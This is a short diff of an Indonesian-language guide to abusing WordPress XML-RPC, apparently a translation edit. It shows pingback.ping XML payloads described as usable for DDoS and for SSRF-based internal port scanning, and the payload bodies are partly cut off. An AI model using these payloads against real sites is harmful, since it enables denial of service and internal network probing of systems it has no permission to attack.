@@ -33,7 +33,7 @@ Kemudian berikut cara melakukan exploitnya:
     </methodCall>
     ```
 * Lihat apabila ada *method* ```pingback.ping``` pada list yang ditampilkan
-* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut
+* Jika ada *method* diatas maka bisa dilakukan DDoS dengan *payload* berikut:
     ```
     <methodCall>
     <methodName>pingback.ping</methodName>
@@ -43,7 +43,7 @@ Kemudian berikut cara melakukan exploitnya:
     </value></param></params>
     </methodCall>
     ```
-* Perform SSRF (Internal PORT scan only)
+* Selain itu juga bisa dilakukan serangan SSRF (Khusus untuk port internal) dengan payload berikut:
     ```
     <methodCall>
     <methodName>pingback.ping</methodName>
